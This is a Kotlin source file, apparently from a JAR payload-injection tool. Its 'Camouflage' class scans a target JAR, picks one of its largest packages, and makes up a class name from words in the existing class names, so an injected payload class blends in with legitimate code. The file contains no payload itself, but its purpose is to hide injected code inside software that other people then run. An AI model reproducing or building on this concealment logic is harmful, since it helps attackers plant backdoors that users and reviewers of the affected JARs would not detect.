package com.tmquan2508.inject.core.payload

import com.tmquan2508.inject.cli.Logs
import java.io.File
import java.io.IOException
import java.util.Enumeration
import java.util.Locale
import java.util.zip.ZipEntry
import java.util.zip.ZipFile
import kotlin.random.Random

data class CamouflagePlan(
    val packageName: String,
    val namePrefix: String
)

class Camouflage {
    private val CAMEL_CASE_SPLIT_REGEX = "(?<!(^|[A-Z]))(?=[A-Z])|(?<!^)(?=[A-Z][a-z])".toRegex()

    fun generatePlan(targetJarFile: File): CamouflagePlan {
        val packageStructure = scanJarForPackageStructure(targetJarFile)
        if (packageStructure.isEmpty()) {
            Logs.warn("Target JAR contains no valid packages. Using fallback camouflage.")
            return CamouflagePlan("com/tmquan2508/internal/safe", "InternalTask")
        }

        val packagesSorted = packageStructure.entries
            .filter { it.key.isNotEmpty() && !it.key.startsWith("META-INF") }
            .sortedByDescending { it.value.size }

        if (packagesSorted.isEmpty()) {
            Logs.warn("No suitable packages for camouflage. Using fallback.")
            return CamouflagePlan("com/tmquan2508/internal/fallback", "Task")
        }

        val chosenEntry = packagesSorted[Random.nextInt(packagesSorted.size.coerceAtMost(3))]
        val chosenPackagePath = chosenEntry.key
        val classNamesInPackage = chosenEntry.value

        Logs.debug(" -> Selected package for camouflage: '$chosenPackagePath'")

        val dictionary = buildWordDictionaryFrom(classNamesInPackage)
        if (dictionary.isEmpty()) {
            Logs.warn("Could not build a word dictionary. Using simple fallback name.")
            return CamouflagePlan(chosenPackagePath, "Core")
        }
        Logs.debug(" -> Built a dictionary with ${dictionary.size} words.")

        val simpleNames = classNamesInPackage.map { it.substringBeforeLast(".") }
        val namePrefix = buildUniqueWordName(dictionary, simpleNames, 1, 2)

        return CamouflagePlan(chosenPackagePath, namePrefix)
    }

    private fun scanJarForPackageStructure(jarFile: File): Map<String, List<String>> {
        val packageMap = mutableMapOf<String, MutableList<String>>()
        try {
            ZipFile(jarFile).use { zipFile ->
                val zipEntries: Enumeration<out ZipEntry> = zipFile.entries()
                while (zipEntries.hasMoreElements()) {
                    val entry = zipEntries.nextElement()
                    val entryName = entry.name
                    if (!entry.isDirectory && entryName.endsWith(".class") && !entryName.contains("$") &&
                        !entryName.endsWith("package-info.class") && entryName != "module-info.class") {
                        val packageName = entryName.substringBeforeLast('/', "")
                        val className = entryName.substringAfterLast("/")
                        packageMap.getOrPut(packageName) { mutableListOf() }.add(className)
                    }
                }
            }
        } catch (e: IOException) {
            Logs.warn("[Camouflage] Error scanning JAR file: ${e.message}")
        }
        return packageMap
    }
    
    private fun buildWordDictionaryFrom(classNames: List<String>): List<String> = classNames
        .map { it.substringBeforeLast(".") }
        .flatMap { CAMEL_CASE_SPLIT_REGEX.split(it) }
        .map { it.replace(Regex("[^a-zA-Z0-9]"), "") }
        .filter { it.length > 2 }
        .distinct()

    private fun buildUniqueWordName(dictionary: List<String>, existingNames: List<String>, minWords: Int, maxWords: Int): String {
        var name: String
        var attempts = 0
        do {
            val wordCount = if (maxWords > minWords) Random.nextInt(minWords, maxWords + 1) else minWords
            name = (1..wordCount).joinToString("") {
                dictionary.random().replaceFirstChar { if (it.isLowerCase()) it.titlecase(Locale.getDefault()) else it.toString() }
            }
            if (attempts > 10) name += attempts
            attempts++
        } while (name.isEmpty() || existingNames.contains(name))
        return name
    }
}